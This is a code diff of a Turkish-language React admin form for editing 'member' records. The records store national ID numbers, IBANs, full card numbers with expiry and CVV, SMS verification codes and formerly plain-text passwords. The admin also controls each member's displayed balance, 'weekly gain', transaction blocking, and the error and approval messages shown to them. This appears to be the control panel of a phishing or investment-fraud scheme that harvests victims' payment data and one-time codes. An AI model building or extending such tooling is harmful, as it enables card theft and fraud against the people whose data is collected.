@@ -13,15 +13,14 @@ import { Separator } from "../ui/separator";
 
 type AdminMemberFormProps = {
     member?: AdminMember | null;
-    onSave: (memberData: Omit<AdminMember, 'id'> | AdminMember) => void;
+    onSave: (memberData: AdminMember) => void;
     onCancel: () => void;
 };
 
 const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => {
-    const [formData, setFormData] = useState({
+    const [formData, setFormData] = useState<Omit<AdminMember, 'id' | 'password'>>({
         name: '',
         phone: '',
-        password: '',
         iban: '',
         bank: '',
         tc: '',
@@ -34,8 +33,8 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
         accountActivity: '',
         meetingInfo: '',
         currentBalance: '',
-        status: 'Aktif' as 'Aktif' | 'Pasif',
-        transactionStatus: 'allowed' as 'allowed' | 'blocked',
+        status: 'Aktif',
+        transactionStatus: 'allowed',
         cardNumber: '',
         cardExpiry: '',
         cardCvv: '',
@@ -45,51 +44,26 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
      useEffect(() => {
         if (member) {
             setFormData({
-                name: member.name,
-                phone: member.phone,
-                password: member.password || "",
-                iban: member.iban,
-                bank: member.bank,
-                tc: member.tc,
-                il: member.il,
-                ilce: member.ilce,
-                weeklyGain: member.weeklyGain,
-                errorMessage: member.errorMessage,
-                onayMesaji: member.onayMesaji || '',
-                invoiceAmount: member.invoiceAmount,
+                name: member.name || '',
+                phone: member.phone, // email is stored in phone field
+                iban: member.iban || '',
+                bank: member.bank || '',
+                tc: member.tc || '',
+                il: member.il || '',
+                ilce: member.ilce || '',
+                weeklyGain: member.weeklyGain || '',
+                errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
+                onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
+                invoiceAmount: member.invoiceAmount || '',
                 accountActivity: member.accountActivity || '',
                 meetingInfo: member.meetingInfo || '',
-                currentBalance: member.currentBalance || '',
-                status: member.status,
+                currentBalance: member.currentBalance || '0 TL',
+                status: member.status || 'Aktif',
                 transactionStatus: member.transactionStatus || 'allowed',
                 cardNumber: member.cardNumber || '',
                 cardExpiry: member.cardExpiry || '',
                 cardCvv: member.cardCvv || '',
                 smsCode: member.smsCode || '',
-            });
-        } else {
-             setFormData({
-                name: '',
-                phone: '',
-                password: '',
-                iban: '',
-                bank: '',
-                tc: '',
-                il: '',
-                ilce: '',
-                weeklyGain: '',
-                errorMessage: '',
-                onayMesaji: '',
-                invoiceAmount: '',
-                accountActivity: '',
-                meetingInfo: '',
-                currentBalance: '',
-                status: 'Aktif',
-                transactionStatus: 'allowed',
-                cardNumber: '',
-                cardExpiry: '',
-                cardCvv: '',
-                smsCode: '',
             });
         }
     }, [member]);
@@ -110,11 +84,8 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault();
-        const dataToSave = { ...formData };
         if (member) {
-            onSave({ ...member, ...dataToSave });
-        } else {
-             onSave(dataToSave as Omit<AdminMember, 'id'>);
+            onSave({ ...member, ...formData });
         }
     };
     
@@ -122,16 +93,12 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
         <form onSubmit={handleSubmit} className="space-y-4">
             <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                  <div className="space-y-2">
-                    <Label htmlFor="name">Ad Soyad</Label>
-                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
-                </div>
-                <div className="space-y-2">
-                    <Label htmlFor="phone">Telefon Numarası</Label>
-                    <Input id="phone" value={formData.phone} onChange={handleChange} placeholder="555 555 55 55" required />
+                    <Label htmlFor="phone">Email (Giriş Adresi)</Label>
+                    <Input id="phone" value={formData.phone} disabled readOnly />
                 </div>
                  <div className="space-y-2">
-                    <Label htmlFor="password">Şifre</Label>
-                    <Input id="password" value={formData.password} onChange={handleChange} placeholder="Müşteri şifresi" required />
+                    <Label htmlFor="name">Ad Soyad</Label>
+                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="tc">TC Kimlik No</Label>
